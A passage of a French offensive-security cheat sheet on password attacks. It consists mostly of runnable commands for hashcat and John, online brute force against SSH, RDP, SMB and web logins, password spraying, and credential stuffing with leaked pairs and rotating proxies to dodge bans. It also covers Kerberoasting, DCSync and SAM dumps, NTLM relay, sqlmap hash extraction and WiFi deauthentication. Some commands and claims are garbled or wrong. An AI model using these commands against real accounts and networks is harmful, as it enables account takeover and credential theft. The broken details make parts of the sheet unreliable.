# Affiche : GPUs NVIDIA/AMD, OpenCL platforms, driver version

# Forcer un device spécifique
hashcat -m 1000 -a 0 hash.txt rockyou.txt -d 1        # GPU 1
hashcat -m 1000 -a 0 hash.txt rockyou.txt -d 1,2      # GPU 1+2

# Forcer le type de device
hashcat -m 1000 -a 0 hash.txt rockyou.txt --opencl-device-types 2  # GPU only
hashcat -m 1000 -a 0 hash.txt rockyou.txt --opencl-device-types 1  # CPU only

# En cas de GPU blacklisté/blacklisté
hashcat -m 1000 -a 0 hash.txt rockyou.txt -d 1 --force
```

### 7.2 Workload Profiles

| Profil | `-w` | Description | Cas d'usage |
|---|---|---|---|
| Default | `1` | Faible charge GPU | Machine de travail active |
| Performance | `2` | Charge moyenne | Usage bureau léger |
| Turbo | `3` | Charge élevée | Machine dédiée cracking |
| Nightmare | `4` | Charge maximale | Machine 100% dédiée |

```bash
# Profil maximum pour machine dédiée
hashcat -m 1000 -a 0 hash.txt rockyou.txt -w 3

# Profil modéré si on veut garder la machine utilisable
hashcat -m 1000 -a 0 hash.txt rockyou.txt -w 2
```

### 7.3 Optimisations avancées

```bash
# Optimized kernel (plus rapide mais consomme plus de mémoire)
hashcat -m 1000 -a 0 hash.txt rockyou.txt \
  --optimized-kernel-enable \
  --workload-profile 3

# Ignorer les warnings
hashcat -m 1000 -a 0 hash.txt rockyou.txt --force

# Segment size (pour les très grosses wordlists)
hashcat -m 1000 -a 0 hash.txt rockyou.txt --segment-size 256

# Status pendant le cracking
hashcat -m 1000 -a 0 hash.txt rockyou.txt \
  --status --status-timer=10 \
  --session=crack_session

# Estimer le temps avant de lancer
hashcat -m 1000 -a 0 hash.txt rockyou.txt --speed-only
```

### 7.4 Brain Server (Partage de candidats)

Le **brain server** de hashcat permet de partager l'état du cracking entre plusieurs instances pour éviter les doubles tests.

```bash
# Démarrer le brain server
hashcat --brain-server --brain-port 13743

# Se connecter au brain server
hashcat -m 1000 -a 0 hash.txt rockyou.txt \
  --brain-client --brain-client-features=1 \
  --brain-host=127.0.0.1 --brain-port=13743
```

### 7.5 Benchmarks GPU comparatifs

| Hash Type | GTX 1080 Ti | RTX 3080 | RTX 4090 | AMD RX 7900 XTX |
|---|---|---|---|---|
| MD5 (`-m 0`) | ~35 GH/s | ~64 GH/s | ~124 GH/s | ~45 GH/s |
| NTLM (`-m 1000`) | ~60 GH/s | ~110 GH/s | ~214 GH/s | ~75 GH/s |
| SHA-1 (`-m 100`) | ~20 GH/s | ~37 GH/s | ~72 GH/s | ~25 GH/s |
| SHA-256 (`-m 1400`) | ~8.5 GH/s | ~16 GH/s | ~31 GH/s | ~11 GH/s |
| NetNTLMv2 (`-m 5600`) | ~3 GH/s | ~5.5 GH/s | ~10 GH/s | ~3.5 GH/s |
| Kerberoast (`-m 13100`) | ~1.5 GH/s | ~3 GH/s | ~5.5 GH/s | ~2 GH/s |
| bcrypt (`-m 3200`) | ~200 kH/s | ~350 kH/s | ~700 kH/s | ~250 kH/s |
| WPA2 (`-m 22000`) | ~800 kH/s | ~1.5 MH/s | ~3 MH/s | ~1 MH/s |

> [!info] Les vitesses varient selon le type de hash, le driver, et le workload profile. Ces chiffres sont des estimations pour référence.

### 7.6 Split Mode (Répartition multi-GPU)

```bash
# Hashcat répartit automatiquement sur les GPU
# Vérifier le nombre de devices
hashcat -I

# Lancer sur tous les GPU disponibles
hashcat -m 1000 -a 0 hash.txt rockyou.txt

# Forcer le nombre de threads GPU
hashcat -m 1000 -a 0 hash.txt rockyou.txt -d 1,2,3,4

# Pour des hash très coûteux (bcrypt, Argon2)
# Un seul hash peut être réparti sur plusieurs GPUs
hashcat -m 3200 hash.txt rockyou.txt -d 1,2
```

---

## 8. John the Ripper

> Fiche outil complète : [[Outils/Outil - John the Ripper|John the Ripper]]

### 8.1 Modes principaux

```bash
# Mode dictionary (le plus courant)
john --wordlist=rockyou.txt hash.txt

# Mode incremental (brute-force complet, lent mais exhaustif)
john --incremental hash.txt

# Mode incremental = digits uniquement (pour codes PIN)
john --incremental=digits hash.txt

# Mode double (2 wordlists concaténées)
john --wordlist=word1.txt --wordlist=word2.txt --rules=double hash.txt

# Mode external (script personnalisé)
john --external=memestest hash.txt
```

### 8.2 Format list complet

```bash
# Lister tous les formats supportés
john --list=formats

# Filtrer par pattern
john --list=formats | grep -i ntlm
john --list=formats | grep -i kerberos
john --list=formats | grep -i sha

# Format spécifique
john --format=nt hash.txt
john --format=raw-md5 hash.txt
john --format=krb5tgs hash.txt
john --format=bcrypt hash.txt
john --format=wpapcap hash.txt
john --format=keepass hash.txt
```

### 8.3 Règles John

```bash
# Règles prédéfinies
john --wordlist=rockyou.txt --rules=best hash.txt
john --wordlist=rockyou.txt --rules=KoreLogicRules hash.txt
john --wordlist=rockyou.txt --rules=jumbo hash.txt
john --wordlist=rockyou.txt --rules=single hash.txt

# Règles custom
john --wordlist=rockyou.txt --rules=mypatterns hash.txt
# → Le fichier doit être dans john.conf ou ~/.john/john.conf

# Afficher les résultats
john --show hash.txt
john --show --format=nt hash.txt
```

### 8.4 John vs hashcat — Tableau comparatif

| Critère | [[Outils/Outil - hashcat|hashcat]] | [[Outils/Outil - John the Ripper|John]] |
|---|---|---|
| **Vitesse GPU** | Beaucoup plus rapide | CPU principalement |
| **Formats supportés** | 300+ formats | 250+ formats |
| **Interface** | CLI uniquement | CLI + john.conf |
| **Potfile** | `~/.hashcat/hashcat.potfile` | `~/.john/john.pot` |
| **Règles** | Fichiers de règles externes | Intégrées dans john.conf |
| **Multi-GPU** | Natif, excellent | Limité (john-omp) |
| **Détection auto** | Faut spécifier -m | Détection automatique |
| **ZTEX (FPGA)** | Non | Support FPGA natif |
| **Wordlist** | 1 seule par attaque | 2 avec --wordlist=double |
| **Format john → hashcat** | `hashcat --convert` | Export direct |
| **Open source** | (MIT) | (GPL) |
| **Potfile partagé** | Brain server | Non |
| **Meilleur pour** | GPU cracking rapide | Détection auto, formats exotiques |

### 8.5 Conversion de formats

```bash
# Convertir un hash john vers hashcat
# hashcat peut lire le potfile de john directement
hashcat --potfile-path ~/.john/john.pot -m 1000 -a 0 hash.txt

# Exporter depuis john
john --show --format=nt hash.txt > cracked.txt

# Conversion hashcat → john (pour certains formats)
hashcat --example-hashes | grep -B5 -A20 "NTLM"
```

---

## 9. Génération de Wordlists

> Outils : [[Outils/Outil - CeWL|CeWL]] · [[Outils/Outil - Crunch|Crunch]] · [[Outils/Outil - CUPP|CUPP]] · [[Outils/Outil - kwprocessor|kwprocessor]] · [[Outils/Outil - Mentalist|Mentalist]] · [[Outils/Outil - pydictor|pydictor]] · [[Outils/Outil - rsmangler|rsmangler]] · [[Outils/Outil - SecLists|SecLists]]

La qualité de la wordlist détermine souvent le succès du cracking. Une wordlist générique (rockyou) est un bon premier essai, mais une wordlist **ciblée** est toujours supérieure.

### 9.1 Stratégie de génération

```mermaid
flowchart TD
    A["Besoin de wordlist"] --> B{"On a des infos sur la cible ?"}
    B -->|Oui| C["CeWL (scrape site web)"]
    B -->|Oui| D["CUPP (profil personnel)"]
    B -->|Non| E["rockyou.txt (générique)"]
    C --> F["Combiner + règles"]
    D --> F
    E --> G["Essayer en dict straight"]
    F --> H["Essayer dict + règles"]
    H --> I{"Pas de résultat ?"}
    I -->|Oui| J["Mask / Hybrid / PRINCE"]
    I -->|Non| K["Mot de passe trouvé !"]
    style K fill:#4CAF50,color:#fff
    style J fill:#f44336,color:#fff
```

### 9.2 CeWL — Scraping de site web cible

[[Outils/Outil - CeWL|CeWL]] extrait les mots d'un site web pour créer une wordlist personnalisée.

```bash
# Basique : extraire les mots d'un site
cewl http://192.168.1.10 -w mots_site.txt -m 5
# -m 5 : minimum 5 caractères par mot

# Avec depth (profondeur de crawl)
cewl http://192.168.1.10 -w mots_site.txt -m 5 -d 3

# Avec authentication
cewl http://192.168.1.10 -w mots_site.txt -m 5 --auth_type basic --auth_user admin --auth_pass password

# Exclure les emails
cewl http://192.168.1.10 -w mots_site.txt -m 5 --exclude电子邮件

# Extraire les mots depuis une image (OCR)
cewl http://192.168.1.10/logo.png -w ocr.txt --with-image
```

### 9.3 CUPP — Profiling personnel

[[Outils/Outil - CUPP|CUPP]] génère des wordlists basées sur des informations personnelles (nom, date de naissance, hobbies...).

```bash
# Mode interactif (le plus courant)
cupp -i
# → Répond aux questions : nom, prénom, surnom, date de naissance, etc.
# → Génère : user.txt

# Depuis un fichier AXML (Advanced XML)
cupp -a user.axml

# Télécharger des wordlists prédéfinies
cupp -l
```

### 9.4 Crunch — Motifs systématiques

[[Outils/Outil - Crunch|Crunch]] génère toutes les combinaisons possibles selon un charset et une longueur.

```bash
# Générer tous les mots de 8 caractères en lowercase
crunch 8 8 abcdefghijklmnopqrstuvwxyz -o wordlist.txt

# Mix alphanumérique
crunch 8 8 -f /usr/share/crunch/charset.lst mixalpha-numeric -o wordlist.txt

# Chiffres uniquement de 6 à 8 caractères
crunch 6 8 0123456789 -o chiffres.txt

# Avec un pattern (placeholders)
crunch 10 10 -t @@@@%%%% -o wordlist.txt
# @ = lowercase, % = digits → aaa0000, aaa0001, ...

# Pipe directement vers hashcat (pas de fichier)
crunch 8 8 -f /usr/share/crunch/charset.lst mixalpha-numeric | \
  hashcat -m 1000 -a 0 hash.txt
```

> [!warning] Crunch génère des fichiers **énormes**. Un mask de 8 lowercase = 208 Go. Utilise le pipe (`|`) plutôt que `-o` quand c'est possible.

### 9.5 kwprocessor — Keyboard Walks

[[Outils/Outil - kwprocessor|kwprocessor]] génère des combinaisons de keyboard walks (chemins clavier : `qwerty`, `azerty`, etc.).

```bash
# Basique
kwp basechars/full.base keymaps/en-us.keymap routes/2-to-16-max-3-direction-changes.route -o keywalks.txt

# French keyboard
kwp basechars/full.base keymaps/fr-fr.keymap routes/2-to-16-max-3-direction-changes.route -o keywalks_fr.txt
```

### 9.6 pydictor — Dictionary builder

[[Outils/Outil - pydictor|pydictor]] est un générateur de wordlists flexible avec support de patterns.

```bash
# Basique : générer des mots de 6-8 caractères
pydictor -l 6 --len 8 -o output.txt

# Avec un charset spécifique
pydictor -l 8 --len 8 - charset=lower,digit -o output.txt

# Depuis un fichier de base
pydictor -b base.txt --len 8 -o output.txt
```

### 9.7 rsmangler — Mots composés

[[Outils/Outil - rsmangler|rsmangler]] prend un petit fichier de mots et génère toutes les combinaisons possibles.

```bash
# Créer un fichier avec les mots de base
echo -e "admin\npassword\n2024\nsecret\nroot" > base.txt

# Générer toutes les combinaisons
rsmangler --file base.txt --output mangled.txt

# Avec options
rsmangler --file base.txt --min 6 --max 16 --output mangled.txt
```

### 9.8 Mentalist — Arbre de règles visuel

[[Outils/Outil - Mentalist|Mentalist]] est une interface graphique pour construire des arbres de transformation de mots de passe.

```bash
# Lancer Mentalist
mentalist
# → Interface web sur http://localhost:10000
# → Construire un arbre de règles visuellement
# → Exporter en fichier de règles hashcat
```

### 9.9 SecLists — Collections prêtes à l'emploi

[[Outils/Outil - SecLists|SecLists]] est la collection de wordlists la plus complète pour le pentest.

```bash
# Installer SecLists
sudo apt install seclists
# ou
git clone https://github.com/danielmiessler/SecLists.git

# Les plus utiles pour le cracking
/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt
/usr/share/seclists/Passwords/Common-Credentials/top-10000.txt
/usr/share/seclists/Passwords/Default-Credentials/default-passwords.txt
/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt.tar.gz

# SecLists pour le bruteforce online
/usr/share/seclists/Discovery/Web-Content/common.txt
/usr/share/seclists/Usernames/top-usernames-shortlist.txt
```

### 9.10 Combinator Attacks — Wordlist + Wordlist

```bash
# Combiner deux wordlists
hashcat -m 1000 -a 1 hash.txt wordlist1.txt wordlist2.txt

# Exemple : prénoms + noms
# alice, bob, charlie + smith, jones, brown
# → alicesmith, alicejones, bobsmith, ...

# avec des règles sur la sortie
hashcat -m 1000 -a 1 hash.txt firstnames.txt lastnames.txt -r append_year.rule
```

---

## 10. Attaques Online — Brute-Force

> [!warning] **Limiter la vitesse sinon lockout !**

> Outils : [[Outils/Outil - hydra|hydra]] · [[Outils/Outil - Medusa|Medusa]] · [[Outils/Outil - ncrack|ncrack]] · [[Outils/Outil - Patator|Patator]]

### 10.1 hydra

[[Outils/Outil - hydra|hydra]] est l'outil le plus polyvalente pour les attaques online. Il supporte 50+ protocoles.

```bash
# SSH
hydra -l admin -P rockyou.txt ssh://192.168.1.10 -t 4 -W 5
# -t 4 : 4 threads (éviter les lockout)
# -W 5 : attendre 5 secondes entre chaque groupe

# HTTP POST form
hydra -l admin -P rockyou.txt 192.168.1.10 http-post-form \
  "/login.php:user=^USER^&pass=^PASS^:Invalid credentials"

# HTTP Basic Auth
hydra -l admin -P rockyou.txt 192.168.1.10 http-get /

# RDP
hydra -l admin -P rockyou.txt rdp://192.168.1.10 -f
# -f : stop au premier succès

# FTP
hydra -l ftpuser -P rockyou.txt ftp://192.168.1.10

# SMB
hydra -l admin -P rockyou.txt smb://192.168.1.10

# MySQL
hydra -l root -P rockyou.txt mysql://192.168.1.10

# PostgreSQL
hydra -l postgres -P rockyou.txt postgres://192.168.1.10

# VNC (pas de login, juste le password)
hydra -P rockyou.txt vnc://192.168.1.10

# SNMP (community string)
hydra -P community.txt snmp://192.168.1.10

# Telnet
hydra -l admin -P rockyou.txt telnet://192.168.1.10
```

### 10.2 Medusa

[[Outils/Outil - Medusa|Medusa]] est un parallélisateur de brute-force modulaire.

```bash
# SSH
medusa -h 192.168.1.10 -u admin -P rockyou.txt -M ssh -t 4

# FTP
medusa -h 192.168.1.10 -u ftpuser -P rockyou.txt -M ftp -t 4

# HTTP
medusa -h 192.168.1.10 -u admin -P rockyou.txt -M http -m DIR:/admin

# Multi-utilisateurs
medusa -h 192.168.1.0/24 -U users.txt -P rockyou.txt -M ssh -t 4

# Avec fichier de hosts
medusa -H hosts.txt -u admin -P rockyou.txt -M ssh -t 4
```

### 10.3 ncrack

[[Outils/Outil - ncrack|ncrack]] est spécialisé dans les services réseau avec focus sur la vitesse.

```bash
# SSH
ncrack -p ssh --user admin -P rockyou.txt 192.168.1.10

# RDP
ncrack -p rdp --user administrator -P rockyou.txt 192.168.1.10

# FTP
ncrack -p ftp --user anonymous -P rockyou.txt 192.168.1.10

# Depuis un fichier XML (nmap output)
ncrack -iX nmap_scan.xml -p ssh,rdp,ftp
```

### 10.4 PATATOR

[[Outils/Outil - Patator|Patator]] est un framework de brute-force très flexible avec support de nombreux protocoles.

```bash
# SSH
patator ssh_login host=192.168.1.10 user=admin password=FILE0 \
  0=rockyou.txt -x ignore:fgrep='Login incorrect'

# HTTP form
patator http_fuzz url=http://192.168.1.10/login method=POST \
  body='user=FILE0&pass=FILE1' 0=users.txt 1=rockyou.txt \
  -x ignore:fgrep='Invalid'

# MySQL
patator mysql_login host=192.168.1.10 user=root password=FILE0 \
  0=rockyou.txt

# SMB
patator smb_login host=192.168.1.10 user=admin password=FILE0 \
  0=rockyou.txt

# With rate limiting
patator ssh_login host=192.168.1.10 user=admin password=FILE0 \
  0=rockyou.txt rate-limit=3 -x ignore:fgrep='Permission denied'
```

### 10.5 BruteDum — Multiprotocol

[[Outils/Outil - BruteDum|BruteDum]] brute-force SSH, FTP, Telnet, MySQL, MSSQL, PostgreSQL, SMB, RDP et VNC en un seul outil.

```bash
# Lister les protocoles supportés
brutedum --list

# Brute-force SSH
brutedum --hosts 192.168.1.0/24 --users admin --passwords rockyou.txt --protocols ssh

# Multi-protocoles
brutedum --hosts targets.txt --users users.txt --passwords rockyou.txt --protocols ssh,ftp,rdp
```

### 10.6 Stratégie par protocole

| Protocole | Outil recommandé | Risque lockout | Vitesse max | Notes |
|---|---|---|---|---|
| SSH | hydra, Patator | Moyen | -t 4 à -t 6 | Le plus courant |
| RDP | hydra, ncrack | Élevé | -t 1 à -t 2 | Ne pas dépasser 3 tentatives |
| FTP | hydra, Medusa | Faible | -t 10 | Rarement limité |
| SMB | hydra, CrackMapExec | Moyen | -t 4 | Utiliser nxc en priorité |
| MySQL | hydra, Patator | Faible | -t 10 | Rarement limité |
| PostgreSQL | hydra | Faible | -t 10 | Rarement limité |
| HTTP form | hydra, Patator | Variable | Variable | Analyser le formulaire d'abord |
| VNC | hydra | Faible | -t 10 | Pas de login, juste le password |
| SNMP | hydra | Faible | -t 10 | Tester les community strings |

---

## 11. Password Spraying

> Technique détaillée : [[Techniques/Password Spraying|Password Spraying]]

Le **password spraying** consiste à essayer **un seul mot de passe** contre **beaucoup d'utilisateurs**. C'est l'opposé de la brute-force classique (un user, beaucoup de mots de passe).

### 11.1 Méthodologie

```mermaid
flowchart TD
    A["Énumérer les utilisateurs AD"] --> B["Sélectionner 1-3 mots de passe communs"]
    B --> C["Tester chaque mdp sur TOUS les users"]
    C --> D{"Lockout ?"}
    D -->|Non| E["Continuer le spray"]
    D -->|Oui| F["Attendre reset lockout policy"]
    F --> C
    E --> G{"Résultat trouvé ?"}
    G -->|Oui| H["Accès avec le mdp trouvé"]
    G -->|Non| I["Changer de mot de passe et réessayer"]
    style H fill:#4CAF50,color:#fff
```

### 11.2 Outils de Password Spraying

```bash
# CrackMapExec / NetExec
nxc smb 10.10.10.0/24 -u users.txt -p 'Fall2024!' --no-bruteforce
# --no-bruteforce : ne fait QU'UN essai par user (valeur par défaut)

# nxc avec Kerberos auth
nxc smb 10.10.10.0/24 -u users.txt -p 'Winter2024!' -k --no-bruteforce

# hydra (mode multi-user, un seul mdp)
hydra -L users.txt -p 'Summer2024!' ssh://10.10.10.10 -f -t 4

# Medusa
medusa -h 10.10.10.10 -U users.txt -p 'Admin123!' -M smbnt -t 1

# Patator
patator smb_login host=10.10.10.10 user=FILE0 password=Summer2024! \
  0=users.txt -x ignore:fgrep='STATUS_LOGON_FAILURE'
```

### 11.3 Stratégie de timing

| Stratégie | Délai | Lockout Policy | Cas d'usage |
|---|---|---|---|
| Ultra-conservateur | 1 spray/jour | 5 tentatives / 30 min | AD entreprise stricte |
| Conservateur | 1 spray / 4h | 10 tentatives / jour | AD standard |
| Modéré | 1 spray / 2h | 15 tentatives / jour | AD permissif |
| Agressif | 1 spray / 30 min | 25+ tentatives / jour | Petit réseau |

```bash
# Mots de passe à essayer (spraying AD)
# Basé sur les politiques de mots de passe courantes
Season+Year!        # Summer2024!, Winter2024!
CompanyName+Year    # Microsoft2024, Google2024
CompanyName+Season! # MicrosoftSummer!
Default patterns    # Welcome1!, Password1!, ChangeMe1!
```

### 11.4 Énumération des users AD pour le spray

```bash
# Avec CrackMapExec/NetExec
nxc ldap 10.10.10.10 -u user -p pass --users | tee users.txt

# Avec kerbrute
kerbrute userenum --dc dc01.domain.local -d domain.local usernames.txt

# Avec Impacket
impacket-GetADUsers -all -dc-ip 10.10.10.10 domain/user:password
```

---

## 12. Credential Stuffing

Le **credential stuffing** utilise des paires username/password déjà compromises (fuites de données) pour tenter de s'authentifier sur d'autres services.

### 12.1 Méthodologie

```mermaid
flowchart LR
    A["DB de fuites\n(leaked DBs)"] --> B["Filtrer les paires\nuser:pass valides"]
    B --> C["Distribuer sur proxy\n(rotating proxies)"]
    C --> D["Tester sur le site cible"]
    D --> E{"Rate limiting ?"}
    E -->|Non| F["Continuer"]
    E -->|Oui| G["Changer de proxy / ralentir"]
    F --> H{"Succès ?"}
    H -->|Oui| I["Enregistrer les credentials valides"]
    H -->|Non| J["Passer au site suivant"]
    style I fill:#4CAF50,color:#fff
```

### 12.2 Outils de Credential Stuffing

```bash
# Burp Suite (Intruder)
# 1. Capturer la requête de login
# 2. Envoyer dans Intruder
# 3. Configurer les positions : §username§ et §password§
# 4. Charger les payloads (username + password lists)
# 5. Lancer l'attaque

# Hydra (form POST)
hydra -L leaked_users.txt -P leaked_passwords.txt \
  target.com http-post-form \
  "/login:username=^USER^&password=^PASS^:Invalid credentials" \
  -t 4 -f

# Patator (plus flexible)
patator http_fuzz url=https://target.com/login method=POST \
  body='username=FILE0&password=FILE1' 0=leaked_pairs.txt 1=leaked_pairs.txt \
  -x ignore:fgrep='invalid'

# Sentry MBA (outils dédié credential stuffing, Windows)
```

### 12.3 Rotation de proxy

```bash
# Utiliser des proxies pour éviter le ban IP
# Fichier de proxies : proxies.txt (format: ip:port)
hydra -L leaked_users.txt -P leaked_passwords.txt \
  target.com http-post-form \
  "/login:user=^USER^&pass=^PASS^:Invalid" \
  -x 4:proxies.txt

# Avec proxychains
proxychains hydra -L leaked_users.txt -P leaked_passwords.txt \
  target.com http-post-form \
  "/login:user=^USER^&pass=^PASS^:Invalid"
```

### 12.4 Détection du credential stuffing

| Signal | Description | Défense |
|---|---|---|
| Multi-accounts login failures | Beaucoup de users différents échouent | Account lockout |
| IP rotation suspects | Même pattern depuis IPs différentes | Rate limiting |
| Impossible travel | Login depuis 2 pays en 5 min | Geolocation check |
| Credential reuse pattern | Usernames connus des fuites | Anomaly detection |
| Burst of POST requests | Pic de requêtes /login | WAF rules |

---

## 13. Cas d'usage — Active Directory

> Voir aussi : [[05 - Active Directory|Active Directory]] · [[Techniques/Kerberoasting|Kerberoasting]] · [[Techniques/LLMNR-NBT-NS Poisoning|LLMNR Poisoning]] · [[Techniques/NTLM Relay|NTLM Relay]] · [[Techniques/Pass-the-Hash|Pass-the-Hash]]

### 13.1 Kerberoast — TGS cracking

Les tickets Kerberoast sont des TGS-REQ chiffrés avec le hash NTLM du compte de service. On peut les cracker hors-ligne.

```bash
# Capture avec Rubeus
Rubeus.exe kerberoast /outfile:kerberoast.txt

# Capture avec Impacket
impacket-GetUserSPNs domain/user:password -dc-ip 10.10.10.10 -request

# Capture avec PowerView
Invoke-Kerberoast -OutputFormat Hashcat | Out-File kerberoast.txt

# Cracking
hashcat -m 13100 kerberoast.txt rockyou.txt -r best64.rule
john --wordlist=rockyou.txt --format=krb5tgs kerberoast.txt

# Avec CrackMapExec
nxc ldap 10.10.10.10 -u user -p pass --kerberoast-all
```

### 13.2 AS-REP Roasting

Les comptes avec `DONT_REQUIRE_PREAUTH` exposent un TGT chiffrable.

```bash
# Énumérer les comptes vulnérables
impacket-GetNPUsers domain/ -dc-ip 10.10.10.10 -usersfile users.txt -format hashcat -outputfile asrep.txt

# Cracking
hashcat -m 18200 asrep.txt rockyou.txt
john --wordlist=rockyou.txt --format=krb5asrep asrep.txt
```

### 13.3 DCSync — Extraction de hashes NTDS

```bash
# Avec Mimikatz
[[Outils/Outil - Mimikatz|Mimikatz]] # lsadump::dcsync /domain:domain.local /all

# Avec Impacket
impacket-secretsdump domain/admin:password@10.10.10.10
# Extrait : NTLM hashes, Kerberos keys, LSA secrets

# Avec CrackMapExec
nxc smb 10.10.10.10 -u admin -p pass --ntds
```

### 13.4 SAM / NTDS extraction locale

```bash
# Windows — dumping SAM
reg save HKLM\SAM C:\temp\SAM.bak
reg save HKLM\SYSTEM C:\temp\SYSTEM.bak
reg save HKLM\SECURITY C:\temp\SECURITY.bak

# Puis extraction des hashes
impacket-secretsdump -sam SAM.bak -system SYSTEM.bak -security SECURITY.bak LOCAL

# Ou avec mimikatz
[[Outil - Mimikatz|Mimikatz]] # lsadump::sam /system:SYSTEM.bak /sam:SAM.bak
```

### 13.5 LLMNR Capture

```bash
# Lancer Responder
[[Outils/Outil - Responder|Responder]] -I eth0 -wrf

# Capturer les hashes NetNTLMv2
# Le fichier sera dans /responder/logs/

# Cracker les hashes capturés
hashcat -m 5600 /responder/logs/SMB-NTLMv2-*.txt rockyou.txt
```

### 13.6 NTLM Relay

```bash
# Configurer ntlmrelayx
impacket-ntlmrelayx -t 10.10.10.10 -smb2support

# Avec Responder (désactiver SMB et HTTP pour relayer)
[[Outils/Outil - Responder|Responder]] -I eth0 --disable-http --disable-smb

# Relayer vers LDAP pour dumper les hashes
impacket-ntlmrelayx -t ldap://10.10.10.10 --dump-laps --dump-gmsa
```

---

## 14. Cas d'usage — Web

> Voir aussi : [[03 - Exploitation Web|Exploitation Web]]

### 14.1 SQLi — Extraction de hash

```bash
# sqlmap peut extraire les hashes depuis une injection SQL
sqlmap -u "http://target.com/page?id=1" --passwords --batch
# → Extrait les hashes de la table users

# Format hashcat de sortie
sqlmap -u "http://target.com/page?id=1" --passwords --batch --forms

# Cracker les hash extraits
hashcat -m 0 sqli_hashes.txt rockyou.txt
hashcat -m 300 sqli_hashes.txt rockyou.txt  # MySQL 4.1+
```

### 14.2 JWT Cracking

Les JWT (JSON Web Tokens) signés avec un secret faible sont vulnérables au brute-force.

```bash
# hashcat mode JWT
echo -n 'eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiYWRtaW4ifQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c' > jwt.txt
hashcat -m 16500 jwt.txt rockyou.txt

# jwt_tool — outil dédié
jwt_tool.py <token> -C -d rockyou.txt

# cracked2john + john
jwt2john <token> > jwt_hash.txt
john --wordlist=rockyou.txt jwt_hash.txt
```

### 14.3 Offline hash dump — Web Apps

```bash
# WordPress (PHPass)
wp-login.php → hash dans la DB : $P$B...
hashcat -m 400 wordpress_hashes.txt rockyou.txt -r best64.rule

# Django (PBKDF2)
hashcat -m 10000 django_hashes.txt rockyou.txt

# Laravel (bcrypt)
hashcat -m 3200 laravel_hashes.txt rockyou.txt

# Drupal 7
hashcat -m 7900 drupal_hashes.txt rockyou.txt
```

### 14.4 bcrypt / scrypt — Stratégie

```bash
# bcrypt est SLOOOW — optimiser le masque
# Si on sait que c'est 8 caractères lowercase+digits
hashcat -m 3200 hash.txt rockyou.txt -a 3 '?l?l?l?l?l?l?l?l?d'
# Beaucoup plus rapide que la dict complète

# Utiliser un GPU puissant (RTX 4090 = ~700 kH/s pour bcrypt)
hashcat -m 3200 hash.txt rockyou.txt -w 3

# Si le hash est trop lent, considérer le contexte
# Un mot de passe bcrypt cost=12 est 4x plus lent que cost=10
```

---

## 15. Cas d'usage — WiFi

> Voir aussi : [[07 - Wireless, MITM & Social Engineering|Wireless]] · [[Outils/Outil - Wifite|Wifite]]

### 15.1 Workflow complet WPA/WPA2

```mermaid
flowchart LR
    A["Mettre en mode monitor"] --> B["Scanner les AP"]
    B --> C["Capturer handshake ou PMKID"]
    C --> D["Convertir en format hashcat"]
    D --> E["Cracker avec rockyou + règles"]
    style E fill:#4CAF50,color:#fff
```

### 15.2 Capture du handshake

```bash
# Mode monitor
airmon-ng start wlan0
airodump-ng wlan0mon

# Capturer le handshake
airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon

# Deauth pour forcer le handshake
aireplay-ng --deauth 10 -a AA:BB:CC:DD:EE:FF wlan0mon
# ou
mdk4 wlan0 d -b AA:BB:CC:DD:EE:FF

# Capturer le PMKID (sans déauth)
hcxdumptool -i wlan0mon --enable_status=1 -o pmkid.pcapng
```

### 15.3 Conversion et cracking

```bash
# hcxpcapngtool — le meilleur outil de conversion
hcxpcapngtool capture.cap -o hash.22000
hcxpcapngtool pmkid.pcapng -o hash.22000

# Cracker avec hashcat
hashcat -m 22000 hash.22000 rockyou.txt -r best64.rule

# Ou aircrack-ng (plus simple mais moins flexible)
aircrack-ng -w rockyou.txt capture.cap
aircrack-ng -w rockyou.txt -b AA:BB:CC:DD:EE:FF capture.cap

# WPA3-SAE — très lent
hashcat -m 22000 hash.22000 rockyou.txt
# WPA3 est significativement plus lent à cracker
```

### 15.4 PMKID Attack (sans client)

```bash
# Le PMKID est directement dans la trame beacon
# Pas besoin de déauth ni de client connecté
hcxdumptool -i wlan0mon --enable_status=1 -o pmkid.pcapng
hcxpcapngtool pmkid.pcapng -o hash.22000
hashcat -m 22000 hash.22000 rockyou.txt
```

---

## 16. Cas d'usage — Fichiers

### 16.1 ZIP / RAR / 7z

```bash
# ZIP → hash → john/hashcat
zip2john archive.zip > hash.txt
john --wordlist=rockyou.txt hash.txt
# ou
hashcat -m 17200 hash.22000 rockyou.txt

# ZIP (hashcat direct)
zip2john archive.zip | cut -d: -f2 > hash.txt
hashcat -m 17200 hash.txt rockyou.txt

# RAR
rar2john archive.rar > hash.txt
john --wordlist=rockyou.txt hash.txt
hashcat -m 12500 hash.txt rockyou.txt  # RAR3
hashcat -m 13000 hash.txt rockyou.txt  # RAR5

# 7z
7z2john archive.7z > hash.txt
john --wordlist=rockyou.txt hash.txt
hashcat -m 11600 hash.txt rockyou.txt
```

### 16.2 PDF

```bash
# PDF → john
pdf2john document.pdf > hash.txt
john --wordlist=rockyou.txt hash.txt

# PDF → hashcat
pdf2john.pl document.pdf | cut -d: -f2 > hash.txt
hashcat -m 10500 hash.txt rockyou.txt  # PDF 1.4-1.6
hashcat -m 10600 hash.txt rockyou.txt  # PDF 1.7 Level 3
hashcat -m 10700 hash.txt rockyou.txt  # PDF 1.7 Level 8
```

### 16.3 MS Office

```bash
# Office 2007+
office2john document.docx > hash.txt
john --wordlist=rockyou.txt hash.txt

# hashcat
hashcat -m 9400 hash.txt rockyou.txt  # Office 2007
hashcat -m 9500 hash.txt rockyou.txt  # Office 2010
hashcat -m 9600 hash.txt rockyou.txt  # Office 2013

# Outlook PST
towards2john.pl outlook.pst > hash.txt
```

### 16.4 KeePass

```bash
# KeePass → john
keepass2john database.kdbx > hash.txt
john --wordlist=rockyou.txt hash.txt

# KeePass → hashcat
keepass2john database.kdbx | cut -d: -f2 > hash.txt
hashcat -m 13400 hash.txt rockyou.txt -r best64.rule

# KeePass 1.x vs 2.x
keepass2john database.kdb  # KeePass 1.x
keepass2john database.kdbx # KeePass 2.x
```

### 16.5 Tableau de référence fichiers

| Type de fichier | Outil de conversion | hashcat `-m` | john `--format` | Difficulté |
|---|---|---|---|---|
| ZIP (encrypted) | `zip2john` | `17200` | `zip` | Variable |
| RAR3 | `rar2john` | `12500` | `rar` | Moyen |
